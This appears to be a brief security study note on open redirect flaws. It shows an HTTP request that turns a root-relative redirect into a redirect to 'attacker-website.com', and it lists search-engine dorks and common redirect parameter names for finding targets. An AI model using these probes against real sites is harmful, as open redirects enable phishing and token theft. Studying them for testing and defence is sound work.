Open Redirection can be both server-based (when redirection happens because of a server header) and [DOM-based](DOM-based%20vulnerabilities.md#DOM-based%20open%20redirection)
# Turning root-relative redirects into open redirects

In some cases, you may encounter server-level redirects that use the path to construct a root-relative URL for the Location header:

```http
GET /example HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: /example/
```

This can potentially still be used for an open redirect if the server lets you use a protocol-relative URL in the path:

```http
GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: //attacker-website.com/example/
```


# Useful dorks

```
site:*site.com inurl: redirect
site:*site.com inurl: url
site:*site.com inurl: fallback
site:*site.com inurl: target
site:*site.com inurl: http
```

# Common parameters

```
?url=
?link=
?redirect=
?redirecturl=
?redirect_uri=
?return=
?return_to=
?returnurl=
?go=
?goto=
?exit=
?exitpage=
?fromurl=
?fromuri=
?redirect_to=
?next=
?newurl=
?redir=
```